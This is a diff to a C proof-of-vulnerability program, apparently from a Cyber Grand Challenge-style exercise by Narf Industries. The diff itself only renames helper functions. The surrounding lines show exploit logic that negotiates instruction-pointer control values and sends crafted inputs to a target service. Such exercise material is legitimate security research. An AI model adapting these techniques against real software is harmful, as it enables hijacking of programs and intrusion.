@@ -1,7 +1,7 @@
 /*
  * Copyright (C) Narf Industries <info@narfindustries.com>
  *
- * Permission is hereby granted, __free of charge, to any person obtaining a
+ * Permission is hereby granted, free of charge, to any person obtaining a
  * copy of this software and associated documentation files (the "Software"),
  * to deal in the Software without restriction, including without limitation
  * the rights to use, copy, modify, merge, publish, distribute, sublicense,
@@ -31,15 +31,15 @@ unsigned int noun[4096];
 unsigned int adv[4096];
 unsigned int verb[4096];
 
-void *__calloc(size_t s) {
-    void *p = __malloc(s);
+void *calloc(size_t s) {
+    void *p = malloc(s);
     if (!p)
         return NULL;
-    __memset(p, '\0', s);
+    memset(p, '\0', s);
     return p;
 }
 
-char * __strcat(char *dest, const char *src) {
+char * strcat(char *dest, const char *src) {
     char *res = dest;
 
     while(*dest++);
@@ -54,7 +54,7 @@ char * __strcat(char *dest, const char *src) {
     return res;
 }
 
-void __itoa(unsigned int n, char *s) {
+void itoa(unsigned int n, char *s) {
     int i = 0;
     unsigned int orig = n;
     do {
@@ -80,7 +80,7 @@ void build_crc_map(unsigned int *c, char **list) {
     int i;
 
     for (i=0; i < 4096; i++) {
-        c[i] = crc32(list[i],__strlen(list[i]));
+        c[i] = crc32(list[i],strlen(list[i]));
     }
 }
 
@@ -114,10 +114,10 @@ int main(void) {
    type1_vals t1vals;
    type1_negotiate(0x00ffffff, 0xffffff00, 1, &t1vals);
 
-   transmit_all(0, setup, __strlen(setup));
+   transmit_all(0, setup, strlen(setup));
 
-   __itoa(0x80000000|(t1vals.ipval&0x00ffffff), num);
-   transmit_all(0, num, __strlen(num));
+   itoa(0x80000000|(t1vals.ipval&0x00ffffff), num);
+   transmit_all(0, num, strlen(num));
 
    //we want "secure" mode
    transmit_all(0, "1\n", 2);
@@ -155,8 +155,8 @@ noun_verb_adv:
 
 done:
    for (i = 0; i < 4; i++) {
-       __itoa(indexes[i], num);
-       transmit_all(0, num, __strlen(num));
+       itoa(indexes[i], num);
+       transmit_all(0, num, strlen(num));
    }
 
     while(1) {
